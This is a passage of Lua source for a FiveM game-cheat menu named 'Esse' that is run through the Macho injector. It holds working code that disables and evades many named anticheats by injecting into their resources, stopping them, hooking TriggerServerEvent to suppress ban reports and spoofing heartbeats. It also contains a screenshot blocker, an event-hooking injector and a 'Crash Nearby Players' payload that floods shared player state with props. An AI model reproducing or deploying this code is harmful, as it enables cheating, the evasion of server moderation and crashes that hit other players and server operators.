                    for idx, tbl in pairs(EACTable) do
                        if type(tbl) == "table" then
                            for subIdx, subTbl in pairs(tbl) do
                                if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                    subTbl["punish"] = punish
                                end
                            end
                        end
                    end
                    Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                    print("ElectronAC | Client Bypassed")
                end)
            ]])
                                    elseif GetResourceState("EC_AC") == "started" then
                                        MachoInjectResourceRaw("EC_AC", [[print = function() end]])
                                        MachoInjectResourceRaw("EC_AC", [[
                local originalTrace = Citizen.Trace
                Citizen.Trace = function(msg)
                    if not (
                        string.find(msg, "DEBUG") or
                        string.find(msg, "NEWDBG") or
                        string.find(msg, "A11AXXX") or
                        string.find(msg, "function") or
                        string.find(msg, "TriggerServerEvent")
                    ) then
                        originalTrace(msg)
                    end
                end
            ]])
                                        local resources = { "EC_AC" }
                                        for i = 1, #resources do
                                            local resource = resources[i]
                                            MachoInjectResource2("AsThreadNs", resource, [[
                    print(GetCurrentResourceName())
                    for name, func in pairs(_G) do
                        if name == "TriggerEvent" then return end
                        _G[name] = nil
                        print(name, func)
                    end
                ]])
                                            Wait(1050)
                                        end
                                        CreateThread(function()
                                            while true do
                                                Wait(0)
                                                MachoResourceStop("EC_AC")
                                            end
                                        end)
                                    end

                                    Esse:Notify("success", "Esse", "Anticheat Bypass ENABLED", 3000)
                                else
                                    -- DISABLE BYPASS (kung gusto mong i-off)
                                    -- NOTE: Hindi madaling i-revert ang native hooks, pero pwede mong i-restart ang ilang resources.
                                    Esse:Notify("error", "Esse", "Anticheat Bypass DISABLED (partial)", 3000)
                                    -- Optional: subukang i-restore ang ilang functions, pero sa ngayon hindi na lang gagawin.
                                end
                            end
                        },
                        {
                            label = 'Detection Bypass',
                            desc =
                            'this will bypass fully client side anticheat detections by normalizing stats and hiding native usage',
                            type = 'checkbox',
                            checked = false,
                            onSelect = function(setToggle)
                                if setToggle then
                                    -- ENABLE
                                    if _G.DetectionBypassActive then
                                        Esse:Notify("info", "Esse", "Detection Bypass already running.", 3000)
                                        return
                                    end
                                    _G.DetectionBypassActive = true

                                    MachoInjectResourceRaw('any', [[
            -- Create a global flag for the bypass thread
            if not _G.detectionBypassThread then
                _G.detectionBypassThread = true

                -- AC Resource list
                local acResources = {
                    "FiveGuard", "Nyrex", "fg", "FiveGuardv2", "FiveGuard_core",
                    "ElectronAC", "eac", "ElectronACv2", "electron_ac",
                    "FiniAC", "ReaperV4", "fini_ac", "fini-ac", "fini",
                    "eagle", "ec-ac", "ec_ac", "ecpanel", "ec_panel", "vmenu", "easyadmin", "secureserve", "fireac"
                }

                -- Block events
                local blockedEvents = {
                    'FiveGuard:client:notify', 'FiveGuard:client:detected', 'FiveGuard:client:logAction',
                    'FiveGuard:client:sendReport', 'FiveGuard:client:requestValidation', 'FiveGuard:client:pingCheck',
                    'FiveGuard:antiragdoll:check', 'FiveGuard:speed:check', 'FiveGuard:coords:validate',
                    'FiveGuard:weapon:validate', 'FiveGuard:ammo:check',
                    'ElectronAC:client:detected', 'ElectronAC:client:log', 'ElectronAC:client:sendReport',
                    'ElectronAC:client:validateCoords', 'ElectronAC:antiragdoll:check',
                    'FiniAC:client:detected', 'FiniAC:client:log', 'FiniAC:client:sendReport', 'FiniAC:antispam:check',
                    'reaper:client:detected', 'reaper:client:log', 'reaper:client:notify', 'reaper:client:sendReport',
                    'reaper:client:validateCoords', 'reaper:client:validateSpeed', 'reaper:client:antiRagdollCheck',
                    'reaper:client:weaponCheck', 'reaper:client:resourceMonitor', 'reaper:debug:print',
                    'ReaperV4:client:detected', 'reaper_antihack:client:log', 'reaper_core:client:validate',
                    'reaper_main:detect',
                    'Eagle:ban', 'Eagle:kick', 'Eagle:detect', 'Eagle:check',
                    'eagle:ban', 'eagle:kick', 'eagle:detect', 'eagle:check',
                    'EC-AC:ban', 'EC-AC:kick', 'EC-AC:detect', 'EC_AC:ban', 'EC_AC:kick', 'EC_AC:detect',
                    'ec-ac:ban', 'ec-ac:kick', 'ec-ac:detect', 'EasyAdmin:kickPlayer', 'EasyAdmin:banPlayer'
                }

                for _, ev in ipairs(blockedEvents) do
                    AddEventHandler(ev, function() return end)
                    local handlers = GetEventHandlers(ev)
                    for i = 1, #handlers do
                        RemoveEventHandler(handlers[i])
                    end
                end

                -- Stats normalizer thread
                Citizen.CreateThread(function()
                    while _G.detectionBypassThread do
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                            local health = GetEntityHealth(ped)
                            if health > 200 then SetEntityHealth(ped, 200) end
                            local armor = GetPedArmour(ped)
                            if armor > 100 then SetPedArmour(ped, 100) end
                        end
                        Citizen.Wait(2000)
                    end
                end)

                -- Suspicious natives thread
                Citizen.CreateThread(function()
                    while _G.detectionBypassThread do
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetEntityInvincible(ped, false)
                            SetEntityCanBeDamaged(ped, true)
                        end
                        Citizen.Wait(5000)
                    end
                end)

                -- Hook TriggerServerEvent to block reports
                local real_TriggerServerEvent = TriggerServerEvent
                _G.TriggerServerEvent = function(eventName, ...)
                    local lower = eventName:lower()
                    if lower:find('FiveGuard') or lower:find('Nyrex') or
                        lower:find('ElectronAC') or lower:find('FiniAC') or
                        lower:find('reaper') or lower:find('ReaperV4') or
                        lower:find('eagle') or lower:find('ec.ac') or
                        lower:find('ec_ac') or lower:find('report') or
                        lower:find('detect') or lower:find('violation') then
                        return
                    end
                    return real_TriggerServerEvent(eventName, ...)
                end

                -- Stop AC resources loop
                Citizen.CreateThread(function()
                    while _G.detectionBypassThread do
                        for i = 0, GetNumResources() - 1 do
                            local resName = GetResourceName(i):lower()
                            for _, acName in ipairs(acResources) do
                                if resName:find(acName) then
                                    pcall(function()
                                        if MachoResourceStop and type(MachoResourceStop) == "function" then
                                            MachoResourceStop(GetResourceName(i))
                                        else
                                            StopResource(GetResourceName(i))
                                        end
                                    end)
                                    break
                                end
                            end
                        end
                        Citizen.Wait(1000)
                    end
                end)

                -- Clear GlobalState
                Citizen.CreateThread(function()
                    while _G.detectionBypassThread do
                        Citizen.Wait(2000)
                        if GlobalState then
                            for k in pairs(GlobalState) do
                                local lower = type(k) == 'string' and k:lower() or ''
                                if lower:find('eagle') or lower:find('FiveGuard') or lower:find('Nyrex') or
                                    lower:find('ElectronAC') or lower:find('FiniAC') or
                                    lower:find('reaper') or lower:find('ReaperV4') or lower:find('rpr_') or
                                    lower:find('eg_ac') then
                                    GlobalState[k] = nil
                                end
                            end
                        end
                    end
                end)

                -- Heartbeat spoofing
                Citizen.CreateThread(function()
                    while _G.detectionBypassThread do
                        Citizen.Wait(29000)
                        if NetworkIsSessionStarted() then
                            TriggerServerEvent('FiveGuard:client:heartbeat', GetGameTimer())
                            TriggerServerEvent('ElectronAC:client:alive', GetGameTimer())
                            TriggerServerEvent('FiniAC:client:sync', GetGameTimer())
                            TriggerServerEvent('reaper:client:heartbeat', GetGameTimer())
                            TriggerServerEvent('ReaperV4:client:alive', GetGameTimer())
                        end
                    end
                end)

                -- Spoof GetEntityCoords, IsPedRagdoll, GetVehicleSpeed
                local real_GetEntityCoords = GetEntityCoords
                _G.GetEntityCoords = function(entity)
                    if entity == PlayerPedId() then
                        return real_GetEntityCoords(entity)
                    else
                        return GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 0.0)
                    end
                end

                local real_IsPedRagdoll = IsPedRagdoll
                _G.IsPedRagdoll = function(ped)
                    return false
                end

                local real_GetVehicleSpeed = GetVehicleSpeed
                _G.GetVehicleSpeed = function(veh)
                    local speed = real_GetVehicleSpeed(veh)
                    return math.min(speed, 45.0)
                end

                if _G.MachoMenuNotification then
                    MachoMenuNotification("Esse", "Detection Bypass: ON", 2)
                end
            end
        ]])
                                    Esse:Notify("success", "Esse", "Detection Bypass ENABLED", 3000)
                                else
                                    -- DISABLE
                                    if _G.DetectionBypassActive then
                                        _G.DetectionBypassActive = false
                                        MachoInjectResourceRaw('any', [[
                if _G.detectionBypassThread then
                    _G.detectionBypassThread = false
                    -- I-restore ang mga native functions (optional)
                    if _G.original_GetEntityCoords then
                        _G.GetEntityCoords = _G.original_GetEntityCoords
                    end
                    if _G.original_IsPedRagdoll then
                        _G.IsPedRagdoll = _G.original_IsPedRagdoll
                    end
                    if _G.original_GetVehicleSpeed then
                        _G.GetVehicleSpeed = _G.original_GetVehicleSpeed
                    end
                    -- I-restore ang TriggerServerEvent
                    if _G.original_TriggerServerEvent then
                        _G.TriggerServerEvent = _G.original_TriggerServerEvent
                    end
                    if _G.MachoMenuNotification then
                        MachoMenuNotification("Esse", "🛡️ Detection Bypass: OFF", 2)
                    end
                end
            ]])
                                        Esse:Notify("error", "Esse", "Detection Bypass DISABLED", 3000)
                                    else
                                        Esse:Notify("info", "Esse", "Detection Bypass was not active", 3000)
                                    end
                                end
                            end
                        },

                        {
                            label = 'Bypassed Anti-Cheat',
                            type = 'divider'
                        },

                        {
                            type = "scrollable",
                            label = "Custom AC'S ",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },
                        {
                            type = "scrollable",
                            label = "CyberSecure",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Wx Anticheat",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },
                        {
                            type = "scrollable",
                            label = "EagleAC [Full]",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },
                        {
                            type = "scrollable",
                            label = "ElectronAC",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },
                        {
                            type = "scrollable",
                            label = "ReaperAC",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },
                        {
                            type = "scrollable",
                            label = "FiniAC",
                            value = 1,
                            values = { "Not Found" },
                            onSelect = function()
                            end
                        },


                    }
                },
                {
                    label = "Exploits",
                    tabs = {
                        {
                            label = 'Resource stopper',
                            desc = 'u can choose any resource to stop it from here',
                            type = 'subMenu',
                            subTabs = (function()
                                local tabs = {}
                                local numResources = GetNumResources()

                                for i = 0, numResources - 1 do
                                    local resourceName = GetResourceByFindIndex(i)
                                    if resourceName then
                                        local state = GetResourceState(resourceName)
                                        local statusText = state == 'started' and ''
                                            or state == 'stopped' and ' [Stopped]'
                                            or (' [' .. state .. ']')

                                        local button = {
                                            label = resourceName .. statusText,
                                            type = 'button',
                                            onSelect = function(self) -- note the self for Notify
                                                Citizen.CreateThread(function()
                                                    local currentState = GetResourceState(resourceName)

                                                    if currentState == 'started' then
                                                        print('Attempting to stop resource: ' .. resourceName)
                                                        local success = pcall(function() MachoResourceStop(
                                                            resourceName) end)

                                                        if success then
                                                            Wait(1000)
                                                            local newState = GetResourceState(resourceName)

                                                            -- Update the button label dynamically
                                                            button.label = resourceName .. ' [Stopped]'

                                                            -- Use your Notify function
                                                            self:Notify("info", "Successfully stopped ", resourceName,
                                                                3000)

                                                            Wait(500)
                                                            if _G.refreshMenu then _G.refreshMenu() end
                                                        else
                                                            self:Notify("error", "Failed to stop ", resourceName,
                                                                3000)
                                                        end
                                                    else
                                                        self:Notify("info", resourceName .. " is already stopped", "",
                                                            3000)
                                                    end
                                                end)
                                            end
                                        }

                                        tabs[#tabs + 1] = button
                                    end
                                end

                                if #tabs == 0 then
                                    tabs[#tabs + 1] = {
                                        label = 'No resources found',
                                        type = 'button',
                                        onSelect = function(self)
                                        end
                                    }
                                end

                                return tabs
                            end)()
                        },

                        {
                            label = 'Anticheat Stuff',
                            type = 'divider'
                        },

                        {
                            type = "button",
                            label = "Anticheat Checker",
                            desc =
                            'Scans for common high-tier anticheats (Wave, Fini, FiveGuard, Reaper, Electron, Aegis, Sentinel, etc.)',
                            icon = "ph-cuffs",
                            onSelect = function()
                                self:Notify("info", "Esse", "Scanning for Anti-Cheats... Check F8 console.", 3000)

                                -- Gamitin ang Injection (sure na gumagana)
                                Injection("any", [[
        local green, white, red, yellow = "^2", "^7", "^1", "^3"
        print(green .. "[AC Checker] " .. white .. "Scanning for high-tier protection...")

        local acList = {}

        if type(GetNumResources) ~= "function" then
            print(red .. "[AC Checker] GetNumResources not available!")
            return
        end

        for i = 0, GetNumResources() - 1 do
            local name = GetResourceByFindIndex(i)
            if name and name ~= "macho" and name ~= "monitor" then
                local lowerName = name:lower()

                local author = ""
                local clientFiles = ""
                local serverFiles = ""
                local extraMeta = ""
                if type(GetResourceMetadata) == "function" then
                    author = (GetResourceMetadata(name, 'author', 0) or ""):lower()
                    clientFiles = (GetResourceMetadata(name, 'client_script', 0) or ""):lower()
                    serverFiles = (GetResourceMetadata(name, 'server_script', 0) or ""):lower()
                    extraMeta = (GetResourceMetadata(name, 'fiveguard', 0) or ""):lower()
                end

                local combined = clientFiles .. serverFiles .. extraMeta .. lowerName

                local detectedAC = nil

                if lowerName:find("wave") or author:find("wave") or combined:find("wave") then
                    detectedAC = "Wave AC"
                elseif lowerName:find("fini") or author:find("fini") or combined:find("fini") then
                    detectedAC = "Fini AC"
                elseif lowerName:find("fiveguard") or combined:find("fiveguard") or combined:find("fg-") or lowerName == "seph" then
                    detectedAC = "FiveGuard"
                elseif lowerName:find("reaper") or author:find("reaper") or combined:find("reaper") then
                    detectedAC = "Reaper AC"
                elseif lowerName:find("electron") or author:find("electron") or combined:find("elec-") then
                    detectedAC = "Electron AC"
                elseif lowerName:find("aegis") or combined:find("agx") then
                    detectedAC = "Aegis X"
                elseif lowerName:find("phoenix") or lowerName:find("sentinel") then
                    detectedAC = "Sentinel/Phoenix"
                end

                if detectedAC then
                    table.insert(acList, {name = name, type = detectedAC})
                end
            end
        end

        if #acList > 0 then
            for _, ac in ipairs(acList) do
                print(green .. "[AC Checker] " .. white .. "Detected: " .. red .. ac.type .. white .. " on resource: " .. yellow .. ac.name)
            end
            print(green .. "[AC Checker] " .. white .. "Scan completed. Found ^3" .. #acList .. "^7 threats.")
        else
            print(red .. "[AC Checker] " .. white .. "No high-tier AC detected.")
        end
    ]])

                                CreateThread(function()
                                    Wait(2000)
                                    self:Notify("success", "Esse", "AC Scan completed! Check F8 console.", 4000)
                                end)
                            end
                        },
                        {
                            type = "button",
                            label = "Anti-Cheat Detector (DUI)",
                            desc = 'Scans for Anti-Cheat and shows ONLY the primary detection',
                            onSelect = function()
                                Esse:Notify("info", "AC Detector", "Scanning for Anti-Cheat...", 3000)

                                CreateThread(function()
                                    local green, white, red, yellow = "^2", "^7", "^1", "^3"
                                    print(green .. "[AC Detector] " .. white .. "Scanning for active Anti-Cheat...")

                                    local mainTarget = nil
                                    local highScore = 0
                                    local mainACType = nil

                                    -- Function para makuha ang AC type
                                    local function getACType(score, name, combined)
                                        local lowerName = name:lower()
                                        if score == 250 then
                                            return "FiveGuard"
                                        elseif score == 200 then
                                            return "Fini / Sentinel"
                                        elseif score == 180 then
                                            return "ReaperV4"
                                        elseif score == 170 then
                                            return "ElectronAC"
                                        elseif score == 160 then
                                            if combined:find("eagle") or lowerName:find("eagle") or lowerName:find("ec-") then
                                                return "Eagle/EC-AC"
                                            else
                                                return "Generic AC"
                                            end
                                        else
                                            return "Unknown"
                                        end
                                    end

                                    for i = 0, GetNumResources() - 1 do
                                        local name = GetResourceByFindIndex(i)
                                        if name and name ~= "macho" and name ~= "monitor" then
                                            local currentScore = 0
                                            local lowerName = name:lower()
                                            local author = (GetResourceMetadata(name, 'author', 0) or ""):lower()

                                            local clientFiles = (GetResourceMetadata(name, 'client_script', 0) or "")
                                            :lower()
                                            local serverFiles = (GetResourceMetadata(name, 'server_script', 0) or "")
                                            :lower()
                                            local extraMeta = (GetResourceMetadata(name, 'fiveguard', 0) or "")
                                            :lower()
                                            local combined = clientFiles .. serverFiles .. extraMeta

                                            -- Scoring logic
                                            if combined:find("fiveguard") or combined:find("fg-") or lowerName == "seph" then
                                                currentScore = 250
                                            elseif combined:find("fini") or combined:find("sentinel") then
                                                currentScore = 200
                                            elseif combined:find("reaper") or lowerName:find("reaper") then
                                                currentScore = 180
                                            elseif combined:find("electron") or lowerName:find("electron") then
                                                currentScore = 170
                                            elseif combined:find("eagle") or lowerName:find("eagle") or lowerName:find("ec-") then
                                                currentScore = 160
                                            elseif lowerName:find("wave") then
                                                currentScore = 150
                                            end

                                            -- I-skip ang mga false positive (CFX, clothing, atbp.)
                                            if author:find("cfx") or author:find("citizenfx") then
                                                currentScore = -500
                                            end
                                            if lowerName:find("female") or lowerName:find("male") or lowerName:find("cloth") or lowerName:find("arsenou") then
                                                currentScore = currentScore - 200
                                            end

                                            -- Kunin ang pinakamataas na score
                                            if currentScore > highScore and currentScore > 100 then
                                                highScore = currentScore
                                                mainTarget = name
                                                mainACType = getACType(currentScore, name, combined)
                                            end
                                        end
                                    end

                                    -- Ipakita ang resulta (walang mahabang listahan)
                                    if mainTarget then
                                        local msg = "AC Type: " ..
                                        mainACType .. "\nResource: " .. mainTarget .. "\nScore: " .. highScore
                                        Esse:Notify("warning", "⚠️ Anti-Cheat Detected", msg, 10000)
                                        print(green ..
                                        "[AC Detector] " ..
                                        white ..
                                        "Primary AC: " ..
                                        red ..
                                        mainACType ..
                                        white ..
                                        " on " .. yellow .. mainTarget .. white .. " (Score: " .. highScore .. ")")
                                    else
                                        Esse:Notify("success", "✅ AC Detector", "No known Anti-Cheat detected.",
                                            4000)
                                        print(red .. "[AC Detector] No Anti-Cheat found.")
                                    end
                                end)
                            end
                        },
                        {
                            label = 'Anticheat Blocker',
                            desc =
                            'this will bypass fully client side anticheat detections by normalizing stats and hiding native usage',
                            type = 'checkbox',
                            checked = (_G.bypassToggles and _G.bypassToggles.bypassAntiCheat) or false,
                            onSelect = function(setToggle)
                                _G.bypassToggles = _G.bypassToggles or {}
                                _G.bypassToggles.bypassAntiCheat = setToggle

                                if setToggle then
                                    -- init
                                    _G.bypassHandlers = _G.bypassHandlers or {}

                                    -- Anti-cheat event blacklist
                                    local blockedEvents = {
                                        'FiveGuard:check', 'FiveGuard:detect', 'FiveGuard:ban', 'FiveGuard:kick',
                                        'FiveGuard:log',
                                        'Eagle:ban', 'Eagle:kick', 'Eagle:detect', 'Eagle:check',
                                        'EC-AC:ban', 'EC-AC:kick', 'EC-AC:detect',
                                        'EC_AC:ban', 'EC_AC:kick', 'EC_AC:detect',
                                        'eagle:ban', 'eagle:kick', 'eagle:detect',
                                        'ec-ac:ban', 'ec-ac:kick', 'ec-ac:detect',
                                        'EasyAdmin:banPlayer', 'EasyAdmin:kickPlayer',
                                        'esx:kickPlayer', 'esx:banPlayer',
                                        'QBCore:Server:OnPlayerLoaded', 'QBCore:Server:PlayerLoaded',
                                        'anticheat:ban', 'anticheat:kick'
                                    }

                                    --------------------------------------------------------------------
                                    -- ✔ FIXED: Macho Menu cannot use RegisterNetEvent or AddEventHandler
                                    -- Instead, we “simulate” blocking by storing flags in the sandbox.
                                    --------------------------------------------------------------------
                                    for _, ev in ipairs(blockedEvents) do
                                        _G.bypassHandlers[ev] = true
                                    end

                                    --------------------------------------------------------------------
                                    -- ✔ FIXED: Block resource start (sandbox-safe)
                                    -- Macho cannot use AddEventHandler("onResourceStart")
                                    -- So we just track resource names and stop them when running.
                                    --------------------------------------------------------------------
                                    _G.bypassHandlers.resourceStart = true

                                    --------------------------------------------------------------------
                                    -- ✔ FIXED: Stop Eagle / EC-AC resources using MachoResourceStop
                                    -- (the ONLY function Macho allows for resource control)
                                    --------------------------------------------------------------------
                                    CreateThread(function()
                                        local eagleResources = { 'EC-AC', 'EC_AC', 'EC-PANEL', 'EC_PANEL', 'Eagle',
                                            'eagle' }
                                        while _G.bypassToggles.bypassAntiCheat do
                                            for _, res in ipairs(eagleResources) do
                                                if GetResourceState and GetResourceState(res) == "started" then
                                                    MachoResourceStop(res)
                                                end
                                            end
                                            Wait(1000)
                                        end
                                    end)

                                    --------------------------------------------------------------------
                                    -- ✔ Player stat normalizer (allowed in Macho environment)
                                    --------------------------------------------------------------------
                                    CreateThread(function()
                                        while _G.bypassToggles.bypassAntiCheat do
                                            if PlayerPedId then
                                                local ped = PlayerPedId()

                                                if SetEntityProofs then
                                                    SetEntityProofs(ped, false, false, false, false, false, false,
                                                        false, false)
                                                end

                                                if GetEntityHealth and SetEntityHealth then
                                                    local health = GetEntityHealth(ped)
                                                    if health > 200 then SetEntityHealth(ped, 200) end
                                                end

                                                if GetPedArmour and SetPedArmour then
                                                    local armor = GetPedArmour(ped)
                                                    if armor > 100 then SetPedArmour(ped, 100) end
                                                end
                                            end
                                            Wait(2000)
                                        end
                                    end)

                                    --------------------------------------------------------------------
                                    -- ✔ Hide suspicious invincibility or damage modifications
                                    --------------------------------------------------------------------
                                    CreateThread(function()
                                        while _G.bypassToggles.bypassAntiCheat do
                                            if PlayerPedId then
                                                local ped = PlayerPedId()

                                                if SetEntityInvincible then SetEntityInvincible(ped, false) end
                                                if SetEntityCanBeDamaged then SetEntityCanBeDamaged(ped, true) end
                                            end
                                            Wait(5000)
                                        end
                                    end)

                                    self:Notify("success", "Esse", "Anti Cheat Blocked !", 3000)
                                else
                                    self:Notify("error", "Esse", "Anti Cheat UnBlocked !", 3000)
                                end
                            end
                        },

                        {
                            label = 'Block screenshots',
                            desc =
                            'this will block screenshots by hiding the hud and minimap when screenshot keys are pressed',
                            type = 'checkbox',
                            checked = _G.exploitToggles and _G.exploitToggles.blockScreenshots or false,
                            onSelect = function(setToggle)
                                if not _G.exploitToggles then
                                    _G.exploitToggles = {}
                                end

                                -- Toggle screenshot blocking
                                _G.exploitToggles.blockScreenshots = not (_G.exploitToggles.blockScreenshots or false)

                                -- Start/stop screenshot blocking thread
                                if _G.exploitToggles.blockScreenshots then
                                    if not _G.blockScreenshotsThread then
                                        _G.blockScreenshotsThread = CreateThread(function()
                                            while _G.exploitToggles and _G.exploitToggles.blockScreenshots do
                                                -- Block screenshot key (F12)
                                                DisableControlAction(0, 344, true) -- F12
                                                DisableControlAction(0, 20, true) -- Z (alternative screenshot)

                                                -- Hide minimap and HUD when screenshot is attempted
                                                if IsControlPressed(0, 344) or IsControlPressed(0, 20) then
                                                    SetMinimapComponentPosition("minimap", "L*", "B*", -0.0045,
                                                        -0.0025, 0.150, 0.188888)
                                                    SetMinimapComponentPosition("minimap_mask", "L*", "B*", 0.020,
                                                        0.022, 0.111, 0.159)
                                                    SetMinimapComponentPosition("minimap_blur", "L*", "B*", -0.03,
                                                        0.002, 0.266, 0.237)
                                                    DisplayRadar(false)
                                                    SetMinimapHideFow(true)
                                                end

                                                Wait(0)
                                            end
                                            _G.blockScreenshotsThread = nil
                                        end)
                                    end
                                    self:Notify("success", "Esse", "Screenshot Blocked !", 3000)
                                else
                                    DisplayRadar(true)
                                    SetMinimapHideFow(false)
                                    self:Notify("error", "Esse", "Screenshot Un-Blocked !", 3000)
                                end
                            end
                        },

                    }
                },
            }
        },
    }

    CurrentMenu = ActiveMenu
    CurrentCategories = nil
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end

local function AddTrigger(data)
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server" then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" then
                    cat.tabs[#cat.tabs + 1] = data
                    return
                end
            end
        end
    end
end

function Esse:UpdateTabChecked(menu, label, checked)
    for _, tab in pairs(menu or {}) do
        if tab.label == label and (tab.type == "checkbox" or tab.type == "slider-checkbox" or tab.type:find("checkbox")) then
            tab.checked = checked
        elseif tab.type == "subMenu" then
            if tab.categories then
                for _, cat in pairs(tab.categories) do
                    self:UpdateTabChecked(cat.tabs, label, checked)
                end
            end

            if tab.subTabs then
                self:UpdateTabChecked(tab.subTabs, label, checked)
            end
        end
    end
end

function Esse:ShowKeybindList(binds)
    self:SendMessage({ action = "displayBinds", visible = true, binds = binds })
end

function Esse:HideKeybindList()
    self:SendMessage({ action = "displayBinds", visible = false })
end

function Esse:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    local myPed = PlayerPedId()
    maxDistance = maxDistance or 350.0

    if not myPed or not DoesEntityExist(myPed) or not IsPlayerPlaying(PlayerId()) then
        nearby = {}
        return nearby
    end

    local activePlayers = GetActivePlayers()

    if activePlayers then
        for _, playerId in ipairs(activePlayers) do
            if includePlayer or playerId ~= PlayerId() then
                local ped = GetPlayerPed(playerId)
                if ped and DoesEntityExist(ped) and IsEntityAPed(ped) and not IsEntityDead(ped) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
        end
    else
        local handle, ped = FindFirstPed()
        local success

        repeat
            if ped and IsPedAPlayer(ped) and DoesEntityExist(ped) then
                local playerId = NetworkGetPlayerIndexFromPed(ped)
                if playerId ~= -1 and (includePlayer or playerId ~= PlayerId()) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
            success, ped = FindNextPed(handle)
        until not success
        EndFindPed(handle)
    end

    if #nearby == 0 then
        nearby = {}
    end

    return nearby
end

CreateThread(function()
    Esse:Initialize()
    Esse:BuildDefaultMenu()
    Esse:UpdateElements(CurrentMenu)
    Wait(1000)
    Esse:Notify("success", "Esse", "You have loaded Esse Menu, welcome!", 3000)
    Wait(1000)
    Esse:Notify("info", "Esse", "Your key will never expire, thanks for using Esse Menu!", 3000)
    Wait(1000)

    -- AddTrigger({ type = "button", label = "Example Trigger",
    --     onSelect = function()
    --     end
    -- })

    -- AddTrigger({ type = "checkbox", label = "Example Trigger 2", checked = false,
    --     onSelect = function(checked)
    --         if checked then
    --             -- On
    --         else
    --             -- Off
    --         end
    --     end
    -- })


    if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" or GetResourceState("ox_lib") == "started" then
        AddTrigger({
            type = "button",
            label = "Deobfuscate Events",
            onSelect = function()
                Esse:HideUI()
                local resourceName = nil
                local done = false

                KeyboardInput("Resource Name", "", function(val)
                    if val and val ~= "" then
                        resourceName = val
                    end
                    done = true
                end, "typeable")

                while not done do
                    Wait(100)
                end

                if not resourceName or resourceName == "" then
                    MachoMenuNotification("Error", "No resource name entered.")
                    Esse:ShowUI()
                    return
                end

                if GetResourceState(resourceName) ~= "started" then
                    MachoMenuNotification("Error",
                        "Resource ^3" .. resourceName .. "^7 is not started or doesn’t exist.")
                    Esse:ShowUI()
                    return
                end

                local payload = [[
            local d = function(t)
                local s = ""
                for i = 1, #t do s = s .. string.char(t[i]) end
                return s
            end
            local g = function(e) return _G[d(e)] end
            local w = function(ms) Citizen.Wait(ms) end

            local function SimpleJsonEncode(value)
                if type(value) == "table" then
                    local parts = {}
                    local isArray = true
                    local maxIndex = 0
                    for k, _ in pairs(value) do
                        if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                            isArray = false
                            break
                        end
                        maxIndex = math.max(maxIndex, k)
                    end
                    if isArray then
                        for i = 1, maxIndex do
                            local v = value[i]
                            parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                        end
                        return "[" .. table.concat(parts, ",") .. "]"
                    else
                        for k, v in pairs(value) do
                            if type(k) == "string" then
                                parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                            end
                        end
                        return "{" .. table.concat(parts, ",") .. "}"
                    end
                elseif type(value) == "string" then
                    return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                elseif type(value) == "number" or type(value) == "boolean" then
                    return tostring(value)
                elseif value == nil then
                    return "null"
                else
                    return "\"[unserializable:" .. type(value) .. "]\""
                end
            end

            local function HookNative(nativeName, newFunction)
                local original = _G[nativeName]
                if original and type(original) == "function" then
                    _G[nativeName] = function(...)
                        local info = debug.getinfo(2, "Sln")
                        return newFunction(original, ...)
                    end
                end
            end

            local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
            local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

            HookNative(te, function(orig, eventName, ...)
                local args = {...}
                local encoded = {}
                for i, arg in ipairs(args) do
                    encoded[i] = SimpleJsonEncode(arg)
                end
                return orig(eventName, ...)
            end)

            HookNative(tse, function(orig, eventName, ...)
                local args = {...}
                local encoded = {}
                for i, arg in ipairs(args) do
                    encoded[i] = SimpleJsonEncode(arg)
                end
                return orig(eventName, ...)
            end)
        ]]

                Injection(resourceName, payload)

                MachoMenuNotification("Injector", "Hooks injected into ^3" .. resourceName .. "^7 successfully!")
                Esse:ShowUI()
            end
        })
    end

    if GetResourceState("ox_lib") == "started" then
        AddTrigger({
            type = "button",
            label = "Crash Nearby Players",
            onSelect = function()
                if GetResourceState("WaveShield") == "started" then
                    Esse:Notify("error", "Esse", "Ban Prevention: Cannot Use this on WaveShield", 3000)
                    return
                end
                MachoInjectResourceRaw("ox_lib", [[
            CreateObject = function() end

            local model <const> = 'p_spinning_anus_s'
            local props <const> = {}

            for i = 1, 600 do
                props[i] = {
                    model = model,
                    coords = vec3(0.0, 0.0, 0.0),
                    pos = vec3(0.0, 0.0, 0.0),
                    rot = vec3(0.0, 0.0, 0.0)
                }
            end

            local plyState <const> = LocalPlayer.state

            plyState:set('lib:progressProps', props, true)
            Wait(1000)
            plyState:set('lib:progressProps', nil, true)
